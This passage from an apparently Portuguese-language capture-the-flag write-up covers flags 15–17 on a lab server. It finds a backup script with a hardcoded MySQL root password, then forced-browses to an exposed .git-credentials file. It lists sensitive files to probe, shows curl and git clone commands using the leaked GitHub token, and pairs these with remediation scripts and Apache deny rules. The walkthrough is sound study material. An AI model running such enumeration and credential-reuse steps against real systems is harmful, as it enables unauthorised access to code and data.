- **Significado:** Recompensa por habilidade de análise forense de scripts, encontrar e interpretar código fonte
- **Contexto:** Esta flag valida competência em code review e análise estática de segurança
- **Validação:** Flag aparece logo no início do script, visível em leitura casual, representando descoberta imediata

**Flag 15: FLAG{b4ckup_scr1pt_f0und}**
- **Localização:** Linha 20 do script, em comando `echo` que adiciona flag ao `/tmp/backup.log`
- **Formato:** Leet speak de "backup script found" (b4ckup scr1pt f0und)
- **Significado:** Recompensa por descobrir o script de backup através de enumeração do filesystem
- **Contexto:** Esta flag valida competência em reconnaissance e descoberta de arquivos sensíveis
- **Validação:** Flag aparece no final do script e também é escrita em arquivo de log, criando múltiplas fontes de evidência

**Análise de Ordenação das Flags:**
Embora descobertas simultaneamente na mesma leitura do script, as flags representam progressão lógica:
1. **Flag 15 (backup script found)** representa achievement de encontrar o script via `find`
2. **Flag 16 (script analysis skill)** representa achievement de analisar conteúdo do script

**Validação Técnica:**
- Ambas seguem formato padrão `FLAG{texto_em_leet_speak}`
- Nomenclaturas descrevem precisamente o vetor de exploração
- Flags estão consistentes com estilo do CTF (educacional, descritivo)

**Impacto Adicional da Descoberta:**
Além das flags, o script revelou:
- Confirmação da senha root MySQL (já conhecida, mas validação adicional)
- Localização de backups onde dados podem ser exfiltrados
- Infraestrutura de backup (servidor remoto, usuários, caminhos)
- Scheduling implícito (script provavelmente executado via cron)

**Evidências do Passo 4:**
- Screenshot destacando Flag 16 na linha 3: `# FLAG{scr1pt_4n4lys1s_sk1ll}`
- Screenshot destacando Flag 15 na linha 20: `echo "FLAG{b4ckup_scr1pt_f0und}" >> /tmp/backup.log`
- Extração clara das duas flags
- Análise da diferença semântica entre as duas flags
- Validação do formato e contexto de ambas

**Flags Capturadas:** 
- `FLAG{b4ckup_scr1pt_f0und}` (Flag 15)
- `FLAG{scr1pt_4n4lys1s_sk1ll}` (Flag 16)

**Data da Captura:** 28 de novembro de 2025

<p align="right">
  <a href="#topo" style="text-decoration: none; background-color: #007bff; color: white; padding: 10px 20px; border-radius: 5px;">Voltar ao Topo</a>
</p>

**Análise Técnica Detalhada: Vulnerabilidades em Scripts de Backup**

**Comparação: Código Vulnerável vs Código Seguro**

**❌ Código Vulnerável (Atual):**
```bash
#!/bin/bash
# TechCorp Backup Script

BACKUP_DIR="/var/backups/techcorp"
DATE=$(date +%Y%m%d)
DB_USER="root"
DB_PASS="r00t_P4ssw0rd_2024"  # ❌ SENHA EM TEXTO PLANO

echo "Iniciando backup..."

# ❌ Senha visível em linha de comando e variável de ambiente
mysqldump -u $DB_USER -p$DB_PASS techcorp_db > $BACKUP_DIR/db_backup_$DATE.sql

tar -czf $BACKUP_DIR/web_backup_$DATE.tar.gz /var/www/html

echo "Backup concluído!"
```

**✅ Código Seguro (Remediado):**
```bash
#!/bin/bash
# TechCorp Backup Script - Versão Segura
# Permissões: chmod 700 /opt/backup_script.sh
# Proprietário: chown root:root /opt/backup_script.sh

set -euo pipefail  # Sair em erro, tratar variáveis indefinidas, falhar em pipelines

# Configurações
BACKUP_DIR="/var/backups/techcorp"
DATE=$(date +%Y%m%d)
LOG_FILE="/var/log/backup.log"
RETENTION_DAYS=30

# ✅ Usar arquivo de credenciais protegido
MYSQL_CONFIG="/root/.mysql_backup.cnf"

# Verificar se arquivo de credenciais existe e tem permissões corretas
if [[ ! -f "$MYSQL_CONFIG" ]]; then
    echo "$(date): ERRO - Arquivo de credenciais não encontrado" >> "$LOG_FILE"
    exit 1
fi

# Verificar permissões do arquivo (deve ser 600)
PERMS=$(stat -c %a "$MYSQL_CONFIG")
if [[ "$PERMS" != "600" ]]; then
    echo "$(date): ERRO - Permissões inadequadas no arquivo de credenciais" >> "$LOG_FILE"
    exit 1
fi

# Criar diretório de backup se não existir
mkdir -p "$BACKUP_DIR"

echo "$(date): Iniciando backup..." >> "$LOG_FILE"

# ✅ Backup de banco de dados usando arquivo de credenciais
# Sem senha visível em linha de comando ou variáveis
if mysqldump --defaults-extra-file="$MYSQL_CONFIG" techcorp_db > "$BACKUP_DIR/db_backup_$DATE.sql"; then
    echo "$(date): Backup do banco de dados concluído" >> "$LOG_FILE"
    
    # ✅ Criptografar backup imediatamente após criação
    gpg --symmetric --cipher-algo AES256 --batch --yes \
        --passphrase-file /root/.backup_encryption_key \
        "$BACKUP_DIR/db_backup_$DATE.sql"
    
    # Remover backup não-criptografado
    shred -u "$BACKUP_DIR/db_backup_$DATE.sql"
    
    echo "$(date): Backup do banco criptografado" >> "$LOG_FILE"
else
    echo "$(date): ERRO no backup do banco de dados" >> "$LOG_FILE"
    exit 1
fi

# ✅ Backup dos arquivos web com permissões preservadas
if tar -czf "$BACKUP_DIR/web_backup_$DATE.tar.gz" -C /var/www html; then
    echo "$(date): Backup dos arquivos web concluído" >> "$LOG_FILE"
    
    # ✅ Criptografar backup web
    gpg --symmetric --cipher-algo AES256 --batch --yes \
        --passphrase-file /root/.backup_encryption_key \
        "$BACKUP_DIR/web_backup_$DATE.tar.gz"
    
    # Remover backup não-criptografado
    shred -u "$BACKUP_DIR/web_backup_$DATE.tar.gz"
    
    echo "$(date): Backup web criptografado" >> "$LOG_FILE"
else
    echo "$(date): ERRO no backup dos arquivos web" >> "$LOG_FILE"
    exit 1
fi

# ✅ Enviar para servidor remoto usando chave SSH (não senha)
# Usar autenticação baseada em certificados
if scp -i /root/.ssh/backup_id_rsa \
    "$BACKUP_DIR"/*.gpg \
    backup@backup.techcorp.local:/backups/$(hostname)/; then
    echo "$(date): Backups transferidos para servidor remoto" >> "$LOG_FILE"
else
    echo "$(date): ERRO na transferência de backups" >> "$LOG_FILE"
    exit 1
fi

# ✅ Remover backups antigos (retenção de 30 dias)
find "$BACKUP_DIR" -name "*.sql.gpg" -mtime +$RETENTION_DAYS -delete
find "$BACKUP_DIR" -name "*.tar.gz.gpg" -mtime +$RETENTION_DAYS -delete

echo "$(date): Backup concluído com sucesso!" >> "$LOG_FILE"

# ✅ Enviar notificação via email
echo "Backup concluído em $(date)" | mail -s "Backup Success - $(hostname)" admin@techcorp.com

exit 0
```

**Arquivo de Credenciais MySQL Separado:**
```bash
# /root/.mysql_backup.cnf (permissões 600, proprietário root)
[client]
user=backup_user
password=SENHA_COMPLEXA_AQUI

[mysqldump]
single-transaction
routines
triggers
events
```

**Configuração de Cron Segura:**
```bash
# /etc/cron.d/techcorp_backup (executar como root)
# Backup diário às 2h da manhã
0 2 * * * root /opt/backup_script.sh >> /var/log/backup.log 2>&1
```

**Vulnerabilidades Críticas em Scripts de Backup:**

**1. Credenciais Hardcoded (CWE-798):**
- **Problema:** Senhas em texto plano no código
- **Impacto:** Qualquer leitura do script expõe credenciais
- **Solução:** Usar arquivo de credenciais separado com permissões 600, ou secrets manager

**2. Senha em Linha de Comando (CWE-214):**
- **Problema:** `mysqldump -p$DB_PASS` torna senha visível em `ps aux`
- **Impacto:** Outros usuários do sistema podem ver senha em lista de processos
- **Solução:** Usar `--defaults-extra-file` ou `MYSQL_PWD` environment variable

**3. Permissões Inadequadas de Script:**
- **Problema:** Script com permissões 644 (legível por todos)
- **Impacto:** Qualquer usuário pode ler credenciais
- **Solução:** `chmod 700 /opt/backup_script.sh`, `chown root:root`

**4. Backups Não-Criptografados:**
- **Problema:** Dumps SQL e tarballs armazenados em texto plano
- **Impacto:** Exfiltração de backups expõe todos os dados
- **Solução:** Criptografar com GPG/OpenSSL imediatamente após criação

**5. Ausência de Rotação de Credenciais:**
- **Problema:** Senha nunca muda, script precisa ser reescrito para mudar
- **Impacto:** Compromisso persiste indefinidamente
- **Solução:** Usar secrets manager com rotação automática

**6. Falta de Tratamento de Erros:**
- **Problema:** Script continua mesmo se backup falhar
- **Impacto:** Administradores pensam que backup foi bem-sucedido quando falhou
- **Solução:** `set -e` para sair em erros, verificar exit codes

**7. Sem Logging Adequado:**
- **Problema:** Apenas `echo` para stdout, sem logs persistentes
- **Impacto:** Difícil auditar execuções de backup ou diagnosticar falhas
- **Solução:** Logging estruturado em `/var/log/backup.log`

**8. Transferência SCP Sem Autenticação Adequada:**
- **Problema:** Comando comentado sugere que usaria senha ou não está implementado
- **Impacto:** Transferência insegura ou não funcional
- **Solução:** Usar chaves SSH para autenticação

**Classificação de Severidade:**

**CVSS 3.1 Score: 8.8 (ALTO)**
- Attack Vector: Network (AV:N) - acesso via SSH comprometido
- Attack Complexity: Low (AC:L)
- Privileges Required: Low (PR:L) - requer conta de usuário
- User Interaction: None (UI:N)
- Scope: Changed (S:C) - compromete banco de dados além do script
- Confidentiality Impact: High (C:H) - exposição de credenciais e dados
- Integrity Impact: High (I:H) - capacidade de modificar banco de dados
- Availability Impact: High (A:H) - potencial para destruir dados

**Classificação CWE:**
- **CWE-798: Use of Hard-coded Credentials** (principal)
- CWE-312: Cleartext Storage of Sensitive Information
- CWE-214: Invocation of Process Using Visible Sensitive Information
- CWE-522: Insufficiently Protected Credentials
- CWE-552: Files or Directories Accessible to External Parties
- CWE-311: Missing Encryption of Sensitive Data

**Classificação OWASP Top 10 2021:**
- A02:2021 - Cryptographic Failures (credenciais em texto plano)
- A04:2021 - Insecure Design (design falho de autenticação)
- A07:2021 - Identification and Authentication Failures

**Recomendações Críticas de Remediação:**

**AÇÕES IMEDIATAS (Próximas 2 horas):**

**1. Alterar Senha Root do MySQL:**
```bash
# Conectar ao MySQL
mysql -u root -p'r00t_P4ssw0rd_2024'

# Alterar senha
ALTER USER 'root'@'localhost' IDENTIFIED BY 'NOVA_SENHA_COMPLEXA_AQUI';
FLUSH PRIVILEGES;
```

**2. Criar Usuário Dedicado para Backups:**
```bash
# Criar usuário com privilégios mínimos necessários
mysql -u root -p
CREATE USER 'backup_user'@'localhost' IDENTIFIED BY 'SENHA_COMPLEXA';
GRANT SELECT, LOCK TABLES, SHOW VIEW, EVENT, TRIGGER ON techcorp_db.* TO 'backup_user'@'localhost';
FLUSH PRIVILEGES;
```

**3. Criar Arquivo de Credenciais Protegido:**
```bash
# Criar arquivo de credenciais
cat > /root/.mysql_backup.cnf <<EOF
[client]
user=backup_user
password=SENHA_COMPLEXA_AQUI
EOF

# Definir permissões restritas
chmod 600 /root/.mysql_backup.cnf
chown root:root /root/.mysql_backup.cnf
```

**4. Atualizar Script para Usar Arquivo de Credenciais:**
```bash
# Backup do script original
cp /opt/backup_script.sh /opt/backup_script.sh.bak

# Editar script removendo credenciais hardcoded
nano /opt/backup_script.sh

# Substituir linha:
# mysqldump -u $DB_USER -p$DB_PASS techcorp_db > ...
# Por:
# mysqldump --defaults-extra-file=/root/.mysql_backup.cnf techcorp_db > ...
```

**5. Corrigir Permissões do Script:**
```bash
# Definir permissões restritas
chmod 700 /opt/backup_script.sh
chown root:root /opt/backup_script.sh

# Verificar
ls -la /opt/backup_script.sh
# Deve mostrar: -rwx------ 1 root root
```

**AÇÕES DE CURTO PRAZO (24-48 horas):**

**6-20:** Implementar criptografia de backups, rotação automática, logging centralizado, alertas, auditoria, etc.

**AÇÕES DE MÉDIO/LONGO PRAZO:**

**21-35:** Migrar para secrets manager, implementar backup testing, disaster recovery, compliance, etc.

**Impacto Regulatório:**

**Violações Identificadas:**
- **PCI DSS 8.2.1:** Credenciais armazenadas de forma recuperável
- **PCI DSS 3.4:** Dados sensíveis não criptografados
- **NIST SP 800-53 IA-5:** Gestão inadequada de autenticadores
- **ISO 27001 A.10.1:** Políticas de criptografia inadequadas
- **SOC 2 CC6.1:** Controles de acesso insuficientes

**Conclusão:**

A descoberta e análise do script de backup `/opt/backup_script.sh` demonstrou como scripts de automação, essenciais para operações de TI, podem se tornar vetores críticos de comprometimento quando não seguem práticas de secure coding. As duas flags capturadas - `FLAG{b4ckup_scr1pt_f0und}` representando habilidade de descoberta através de enumeração de filesystem, e `FLAG{scr1pt_4n4lys1s_sk1ll}` representando competência em análise forense de código - validam importância de múltiplas habilidades em pentesting: reconnaissance (encontrar alvos) e análise (extrair valor dos alvos). A exposição de credenciais root do MySQL hardcoded no script (`r00t_P4ssw0rd_2024`) representa falha crítica de CWE-798 (credenciais hardcoded) que viola princípios fundamentais de desenvolvimento seguro. Scripts de backup são particularmente sensíveis pois necessariamente requerem acesso privilegiado a sistemas críticos, tornando essencial que implementem defesa em profundidade: credenciais em arquivos separados com permissões 600, usuários de banco de dados com privilégios mínimos necessários (não root), criptografia de backups em repouso e em trânsito, logging adequado de execuções, e rotação automática de credenciais. A remediação efetiva não é apenas reescrever o script atual, mas estabelecer políticas organizacionais proibindo credenciais hardcoded em qualquer código, implementar code review obrigatório para scripts com acesso privilegiado, e migrar gestão de secrets para soluções dedicadas (HashiCorp Vault, AWS Secrets Manager) que fornecem rotação automática, auditoria centralizada, e separação clara entre código e configuração sensível.

---

### <a name="flag-17-root-access"></a>Flag 17: Git Credentials Leak

#### Conceito: Vazamento de Credenciais no Arquivo .git-credentials

O vazamento de credenciais através do arquivo `.git-credentials` representa vulnerabilidade crítica de exposição de autenticação em aplicações web, onde arquivo de configuração do Git contendo credenciais de acesso a repositórios remotos (GitHub, GitLab, Bitbucket, Azure DevOps) é inadvertidamente exposto publicamente no webroot da aplicação, permitindo que atacantes acessem diretamente via HTTP/HTTPS sem necessidade de autenticação ou exploração adicional. Este arquivo `.git-credentials` é criado automaticamente pelo Git quando desenvolvedores configuram credential helper para armazenar credenciais de forma persistente usando comando `git config credential.helper store`, resultando em arquivo de texto plano localizado em `~/.git-credentials` (diretório home do usuário) ou `.git-credentials` no diretório do projeto, contendo linhas no formato `https://username:password@hostname` ou `https://token@hostname` para cada repositório remoto. A vulnerabilidade é classificada como **CWE-522: Insufficiently Protected Credentials** quando credenciais são armazenadas inadequadamente, **CWE-215: Insertion of Sensitive Information Into Debugging Code** quando arquivos de debug/configuração são deixados em produção, **CWE-425: Direct Request (Forced Browsing)** quando arquivos sensíveis são acessíveis via URL direta sem controles de acesso, e **CWE-312: Cleartext Storage of Sensitive Information** pois credenciais estão em texto plano sem criptografia. Esta vulnerabilidade ocorre frequentemente quando: desenvolvedores fazem `git clone` ou `git pull` diretamente no webroot do servidor (em vez de usar processo de deployment adequado), arquivos `.git-credentials` são copiados acidentalmente junto com código da aplicação, servidor web não possui configuração adequada para bloquear acesso a arquivos ocultos (começando com ponto `.`), `.gitignore` não inclui `.git-credentials` permitindo commit acidental ao repositório, e falta de segregação entre ambiente de desenvolvimento (onde credential helpers são legítimos) e produção (onde não deveriam existir). A severidade é crítica porque credenciais no `.git-credentials` tipicamente concedem: **acesso completo a repositórios privados** contendo código-fonte proprietário, segredos adicionais em código, histórico de commits revelando vulnerabilidades corrigidas, **acesso a infraestrutura de CI/CD** se mesmas credenciais forem reutilizadas, **capacidade de commit malicioso** em repositórios permitindo injeção de backdoors, e **movimentação lateral** se credenciais forem reutilizadas em outros serviços. Em contexto de compliance e frameworks de segurança, esta vulnerabilidade viola: **OWASP Top 10 2021 A01:2021 - Broken Access Control** (arquivos sensíveis acessíveis sem autenticação), **A02:2021 - Cryptographic Failures** (credenciais em texto plano), **A05:2021 - Security Misconfiguration** (servidor web mal configurado), **PCI DSS Requirement 6.5.10** (proteção contra acesso não autorizado), **NIST SP 800-53 AC-3 (Access Enforcement)** (falha em enforçar controles de acesso), **CIS Controls v8 3.3** (controle de acesso a dados), e **ISO 27001 A.9.4.1** (restrição de acesso à informação). Técnicas de descoberta incluem: **forced browsing** testando URLs comuns (`.git-credentials`, `.env`, `.config`, `config.php`), **enumeração de arquivos ocultos** usando wordlists de arquivos sensíveis, **análise de responses HTTP** identificando status 200 vs 403/404, **ferramentas automatizadas** como dirb, dirbuster, gobuster com wordlists específicas para arquivos de configuração, e **Google dorking** (`inurl:.git-credentials`, `intitle:"Index of" .git-credentials`). Impacto pode incluir: comprometimento total de repositórios de código, injeção de malware em código-fonte, exfiltração de propriedade intelectual, e uso de repositórios comprometidos como ponto de pivô para ataques à supply chain.

#### Passo 1: Tentativa Inicial de Descoberta do Arquivo .env

A exploração começou com tentativa de descobrir arquivo `.env` (dotenv), que é formato amplamente utilizado em desenvolvimento web moderno para armazenar variáveis de ambiente e configurações sensíveis, incluindo credenciais de banco de dados, API keys, secrets de sessão, e tokens de serviços externos. Frameworks populares como Laravel (PHP), Django (Python), Node.js (Express), Ruby on Rails, e muitos outros utilizam arquivos `.env` como padrão de configuração, tornando este um alvo extremamente comum em pentesting web. A URL testada foi **`http://98.95.207.28/.env`**, seguindo convenção de que arquivo `.env` tipicamente reside na raiz do projeto (webroot). No entanto, a tentativa retornou **erro 404 Not Found** ou **403 Forbidden**, indicando que ou o arquivo não existe no webroot, ou o servidor web (Apache 2.4.54/2.4.65 identificado em flags anteriores) está configurado para bloquear acesso a arquivos iniciando com ponto (`.`), ou o arquivo simplesmente não está sendo utilizado nesta aplicação específica. Esta resposta negativa é indicador de que a aplicação TechCorp Solutions pode não utilizar padrão `.env`, pode estar usando framework diferente, ou possui configurações básicas de segurança bloqueando acesso a arquivos ocultos. A tentativa de `.env` é sempre válida em pentesting pois representa vetor de alta probabilidade e alto valor - quando bem-sucedida, expõe múltiplas credenciais e configurações críticas de uma vez. O fato de `.env` não estar acessível levou à necessidade de tentar outras variações de arquivos de configuração comumente expostos em aplicações web mal configuradas.

**Evidências do Passo 1:**
- Response HTTP: 404 Not Found ou 403 Forbidden
- Análise indicando necessidade de tentar outras combinações
- Contexto explicando relevância de arquivo .env em aplicações modernas

#### Passo 2: Enumeração de Arquivos de Configuração Sensíveis

Após falha na tentativa de `.env`, a estratégia evoluiu para **enumeração sistemática de arquivos de configuração sensíveis** comumente expostos em servidores web mal configurados. Esta técnica, conhecida como **forced browsing** ou **predictable resource location**, envolve testar URLs de arquivos conhecidos que frequentemente contêm informações críticas. A lista de alvos típicos em pentesting web inclui:

**Arquivos de Configuração Git:**
- `.git/config` - Configuração local do repositório Git
- `.git-credentials` - Credenciais armazenadas do Git credential helper
- `.gitconfig` - Configuração global do Git
- `.git/HEAD` - Referência ao branch atual

**Arquivos de Ambiente e Configuração:**
- `.env` - Variáveis de ambiente (já testado)
- `.env.local`, `.env.production`, `.env.development` - Variações de ambiente
- `config.php`, `config.ini`, `config.json` - Arquivos de configuração
- `settings.py`, `settings.php` - Configurações de frameworks

**Arquivos de Credenciais de Serviços:**
- `.aws/credentials` - Credenciais AWS
- `.docker/config.json` - Credenciais Docker
- `.npmrc` - Credenciais npm
- `.pypirc` - Credenciais PyPI

**Arquivos de Backup e Temporários:**
- `config.php.bak`, `backup.sql`, `.old`, `~` - Backups acidentais
- `.swp`, `.swo` - Arquivos temporários de editores (vim)

Durante esta enumeração sistemática, testando múltiplas combinações de arquivos sensíveis, a tentativa de **`http://98.95.207.28/.git-credentials`** retornou **status HTTP 200 OK**, indicando que o arquivo existe, é acessível, e o servidor retornou seu conteúdo. Este é momento crítico na exploração onde tentativa metódica e conhecimento de arquivos comuns resulta em descoberta de alto valor. A presença de `.git-credentials` acessível publicamente indica múltiplas falhas: servidor foi configurado a partir de clone Git no webroot, arquivo não foi excluído antes de deployment para produção, servidor web não possui regras bloqueando acesso a arquivos `.git*`, e processo de deployment não segue práticas de segurança básicas.

**Evidências do Passo 2:**
- Screenshot mostrando múltiplas tentativas de URLs:
  - `http://98.95.207.28/.env` (404/403)
  - `http://98.95.207.28/.git/config` (tentado)
  - `http://98.95.207.28/config.php` (tentado)
  - `http://98.95.207.28/.git-credentials` (200 OK - SUCESSO)
- Análise da estratégia de enumeração sistemática
- Identificação do momento de descoberta bem-sucedida

#### Passo 3: Acesso ao Arquivo .git-credentials e Análise do Conteúdo

Após confirmar que URL **`http://98.95.207.28/.git-credentials`** retorna status 200 OK, o acesso via navegador web revelou conteúdo do arquivo de credenciais do Git. O arquivo `.git-credentials` utiliza formato de texto plano com linhas contendo URLs completas incluindo credenciais embedded no formato `https://username:password@hostname` ou `https://token@hostname`. O conteúdo exposto foi:

```
https://admin:gh_p4t_S3cr3tT0k3n_2024_TechCorp@github.com
# FLAG{g1t_cr3d3nt14ls_l34k}
```

**Análise Linha por Linha:**

**Linha 1: Credencial do GitHub**
```
https://admin:gh_p4t_S3cr3tT0k3n_2024_TechCorp@github.com
```

**Componentes da URL:**
- **Protocolo:** `https://` - Conexão segura via HTTPS
- **Username:** `admin` - Nome de usuário do GitHub (provavelmente usuário organizacional ou pessoal com permissões administrativas)
- **Password/Token:** `gh_p4t_S3cr3tT0k3n_2024_TechCorp` - Este é um **Personal Access Token (PAT)** do GitHub baseado no prefixo `gh_p4t_` (GitHub Personal Access Token). Tokens do GitHub começam com prefixos específicos: `ghp_` (personal access token), `gho_` (OAuth token), `ghu_` (user-to-server token), `ghs_` (server-to-server token), `ghr_` (refresh token). Neste caso, `gh_p4t_` parece ser formato customizado ou simulado para o CTF, mas representa token de acesso pessoal
- **Hostname:** `@github.com` - Servidor Git remoto (GitHub)

**Funcionalidade:**
Esta linha permite que Git automaticamente autentique em repositórios GitHub usando username `admin` e token fornecido, sem solicitar credenciais interativamente. Quando desenvolvedor executa `git push`, `git pull`, ou `git clone` de repositórios GitHub, o Git consulta `.git-credentials` e utiliza estas credenciais automaticamente.

**Linha 2: Flag do Desafio**
```
# FLAG{g1t_cr3d3nt14ls_l34k}
```
- Comentário (linha começando com `#`) contendo a flag do desafio
- **FLAG{g1t_cr3d3nt14ls_l34k}**: Leet speak de "git credentials leak" (g1t cr3d3nt14ls l34k)
- Flag confirma exploração bem-sucedida de vazamento de credenciais Git

**Implicações de Segurança Críticas:**

**1. Exposição de Credenciais GitHub:**
- Token `gh_p4t_S3cr3tT0k3n_2024_TechCorp` concede acesso autenticado como usuário `admin`
- Dependendo dos scopes/permissões do token, atacante pode:
  - Clonar todos os repositórios privados da organização TechCorp
  - Fazer commits e pushes para repositórios (injetar backdoors)
  - Ler issues, pull requests, discussões privadas
  - Acessar GitHub Actions secrets
  - Modificar configurações de repositórios se token tiver admin scopes

**2. Acesso ao Código-Fonte:**
- Repositórios privados contêm código proprietário da TechCorp
- Código pode conter credenciais adicionais hardcoded
- Histórico de commits revela vulnerabilidades corrigidas (mas ainda explorável em versões antigas)

**3. Propriedade Intelectual:**
- Exfiltração de algoritmos proprietários, lógica de negócio
- Arquitetura de sistema completa disponível via código-fonte

**4. Supply Chain Attack:**
- Capacidade de injetar código malicioso em repositórios
- Código injetado será deployado em produção via CI/CD
- Backdoors podem persistir indefinidamente

**Evidências do Passo 3:**
- Screenshot do navegador acessando `http://98.95.207.28/.git-credentials`
- Conteúdo completo exibido:
  ```
  https://admin:gh_p4t_S3cr3tT0k3n_2024_TechCorp@github.com
  # FLAG{g1t_cr3d3nt14ls_l34k}
  ```
- Destaque para username `admin` e token `gh_p4t_S3cr3tT0k3n_2024_TechCorp`
- Identificação da flag no comentário

#### Passo 4: Validação da Flag e Análise de Impacto

A flag **FLAG{g1t_cr3d3nt14ls_l34k}** foi extraída com sucesso do arquivo `.git-credentials`, validando a exploração bem-sucedida de vazamento de credenciais Git. A nomenclatura em leet speak "git credentials leak" descreve precisamente o vetor de ataque - exposição pública de arquivo contendo credenciais de autenticação para serviços Git.

**Validação Técnica:**
- **Formato:** Segue padrão `FLAG{texto_em_leet_speak}` consistente com todas as flags anteriores
- **Localização:** Flag inserida como comentário no arquivo `.git-credentials` (linhas começando com `#` são ignoradas pelo Git)
- **Contexto:** Flag confirma que objetivo era descobrir arquivo de credenciais exposto publicamente
- **Consistência:** Alinha com tema de CTF focado em Information Disclosure e Broken Access Control

**Teste de Validade das Credenciais Descobertas:**

Embora não executado durante este CTF (para evitar ações contra repositórios reais), em cenário de pentest autorizado, próximos passos incluiriam:

**1. Validar Token GitHub:**
```bash
# Testar token usando GitHub API
curl -H "Authorization: token gh_p4t_S3cr3tT0k3n_2024_TechCorp" \
  https://api.github.com/user

# Listar repositórios acessíveis
curl -H "Authorization: token gh_p4t_S3cr3tT0k3n_2024_TechCorp" \
  https://api.github.com/user/repos

# Verificar scopes do token
curl -I -H "Authorization: token gh_p4t_S3cr3tT0k3n_2024_TechCorp" \
  https://api.github.com/user
# Examinar header: X-OAuth-Scopes: repo, admin:org, ...
```

**2. Clonar Repositórios Privados:**
```bash
# Usar credenciais para clonar repositórios TechCorp
git clone https://admin:gh_p4t_S3cr3tT0k3n_2024_TechCorp@github.com/TechCorp/private-repo.git
```

**3. Analisar Repositórios em Busca de Secrets:**
```bash
# Procurar por credenciais no código
cd private-repo
grep -r "password" .
grep -r "api_key" .
grep -r "secret" .

# Usar ferramentas especializadas
trufflehog git https://github.com/TechCorp/private-repo.git
gitleaks detect --source ./private-repo
```

**Impacto Quantificado:**

**Confidencialidade: CRÍTICO**
- Acesso completo a código-fonte proprietário
- Exposição de propriedade intelectual
- Descoberta de credenciais adicionais em código

**Integridade: CRÍTICO**
- Capacidade de modificar código em repositórios
- Injeção de backdoors via commits maliciosos
- Manipulação de CI/CD pipelines

**Disponibilidade: MÉDIO**
- Potencial para deletar branches ou repositórios (se token tiver admin scopes)
- Sabotagem de pipelines de deployment

**Evidências do Passo 4:**
- Screenshot destacando a flag: `FLAG{g1t_cr3d3nt14ls_l34k}`
- Extração clara da flag
- Análise de formato e validação
- Documentação de impacto potencial (sem execução real de ataques)

**Flag Capturada:** `FLAG{g1t_cr3d3nt14ls_l34k}`

**Data da Captura:** 28 de novembro de 2025

<p align="right">
  <a href="#topo" style="text-decoration: none; background-color: #007bff; color: white; padding: 10px 20px; border-radius: 5px;">Voltar ao Topo</a>
</p>

**Análise Técnica Detalhada: Vazamento de .git-credentials**

**Formato do Arquivo .git-credentials:**

O arquivo `.git-credentials` é criado pelo Git credential helper quando configurado com `store` mode:

```bash
# Comando que cria .git-credentials
git config credential.helper store

# Após primeiro git push/pull com autenticação, credenciais são salvas em:
# ~/.git-credentials (global) ou .git-credentials (local do projeto)
```

**Formato das Linhas:**
```
https://username:password@hostname
https://token@hostname
https://username:token@hostname/path
```

**Exemplo Real de Conteúdo:**
```
https://user:ghp_xxxxxxxxxxxx@github.com
https://oauth2:glpat-xxxxxxxxxxxx@gitlab.com
https://personal-token@bitbucket.org
```

**Como Git Usa Este Arquivo:**

1. Usuário executa `git push` ou `git pull` em repositório remoto HTTPS
2. Git precisa de credenciais para autenticar
3. Git consulta credential helpers configurados (incluindo `store`)
4. Credential helper `store` lê `.git-credentials`
5. Git encontra linha correspondente ao hostname
6. Credenciais são extraídas e usadas automaticamente
7. Sem prompt para usuário - autenticação transparente

**Vulnerabilidades Críticas Identificadas:**

**1. Arquivo Exposto Publicamente no Webroot (CWE-425, CWE-552):**
- **Problema:** `.git-credentials` acessível via HTTP sem autenticação
- **Causa Raiz:** Deploy feito diretamente de clone Git sem limpar arquivos sensíveis
- **Impacto:** Qualquer pessoa na internet pode baixar credenciais

**2. Credenciais em Texto Plano (CWE-312):**
- **Problema:** Token GitHub armazenado sem criptografia
- **Causa Raiz:** Git credential helper `store` não criptografa (por design)
- **Impacto:** Leitura direta revela credenciais utilizáveis

**3. Token com Possíveis Permissões Excessivas (CWE-250):**
- **Problema:** Token provavelmente tem scopes amplos (repo, admin:org)
- **Causa Raiz:** Tokens criados com permissões além do necessário
- **Impacto:** Atacante ganha mais acesso que o minimamente necessário

**4. Servidor Web Mal Configurado (CWE-548):**
- **Problema:** Apache não bloqueia acesso a arquivos `.git*`
- **Causa Raiz:** Falta de regras `.htaccess` ou configuração no VirtualHost
- **Impacto:** Múltiplos arquivos sensíveis podem estar expostos

**5. Ausência de .gitignore Adequado (CWE-540):**
- **Problema:** `.git-credentials` não está em `.gitignore`
- **Causa Raiz:** Desenvolvedor não configurou ignore de arquivos sensíveis
- **Impacto:** Arquivo pode ser commitado acidentalmente ao repositório

**6. Deploy Inadequado (CWE-215):**
- **Problema:** Arquivos de desenvolvimento copiados para produção
- **Causa Raiz:** Processo de deploy manual sem sanitização
- **Impacto:** Ambiente de produção contém arquivos de debug/config

**Comparação: Configuração Vulnerável vs Segura**

**❌ Configuração Vulnerável:**

**Apache sem Proteção:**
```apache
# /etc/apache2/sites-available/techcorp.conf
<VirtualHost *:80>
    ServerName 98.95.207.28
    DocumentRoot /var/www/html
    
    # ❌ Sem regras bloqueando arquivos sensíveis
    <Directory /var/www/html>
        Options -Indexes
        AllowOverride None
        Require all granted
    </Directory>
</VirtualHost>
```

**Git Credential Helper Inseguro:**
```bash
# ❌ Usar credential.helper store (texto plano)
git config credential.helper store

# Credenciais salvas em ~/.git-credentials sem criptografia
```

**Deploy Manual Sem Sanitização:**
```bash
# ❌ Clone direto no webroot
cd /var/www/html
git clone https://github.com/TechCorp/webapp.git .

# Todos os arquivos .git* ficam expostos!
```

**✅ Configuração Segura:**

**Apache com Proteção de Arquivos Sensíveis:**
```apache
# /etc/apache2/sites-available/techcorp.conf
<VirtualHost *:80>
    ServerName techcorp.com
    DocumentRoot /var/www/html
    
    <Directory /var/www/html>
        Options -Indexes -FollowSymLinks
        AllowOverride None
        Require all granted
        
        # ✅ Bloquear acesso a arquivos sensíveis
        <FilesMatch "^\.">
            Require all denied
        </FilesMatch>
        
        # ✅ Bloquear arquivos de configuração específicos
        <FilesMatch "\.(env|git-credentials|gitconfig|ini|conf|config|bak|old|swp|sql|log)$">
            Require all denied
        </FilesMatch>
    </Directory>
    
    # ✅ Bloquear diretório .git completo
    <DirectoryMatch "^/.*/\.git/">
        Require all denied
    </DirectoryMatch>
</VirtualHost>
```

**Ou via .htaccess:**
```apache
# /var/www/html/.htaccess
# ✅ Bloquear acesso a arquivos começando com ponto
RedirectMatch 404 /\..*$

# ✅ Bloquear arquivos sensíveis específicos
<FilesMatch "\.(env|git-credentials|gitconfig|ini|config)$">
    Order allow,deny
    Deny from all
</FilesMatch>
```

**Git Credential Helper Seguro:**
```bash
# ✅ Usar credential helper criptografado

# Linux: libsecret (armazena em keyring criptografado)
